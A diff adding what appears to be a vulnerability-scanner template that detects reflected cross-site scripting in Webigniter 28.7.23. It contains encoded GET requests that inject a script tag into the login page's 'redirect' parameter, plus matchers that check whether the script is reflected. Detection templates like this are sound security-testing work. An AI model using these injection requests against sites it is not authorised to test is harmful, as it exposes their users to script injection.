@@ -1,0 +1,30 @@
+id: webigniter-xss
+brief:
+    title: Webigniter 28.7.23 - Cross-Site Scripting
+    by: theamanrawat
+    level: medium
+    about: The value of the redirect request parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks. The payload ycsz3"><script>alert(1)</script>bn76w was ...
+    label:
+        - xss
+        - webigniter
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cms/login?redirect=cmsycsz3%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2fscript>bn76w'
+        - '{{BaseURL}}/login?redirect=cmsycsz3%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2fscript>bn76w'
+      signs:
+        - "on": word
+          has:
+            - <script>alert(document.domain)</script>
+            - Webigniter
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
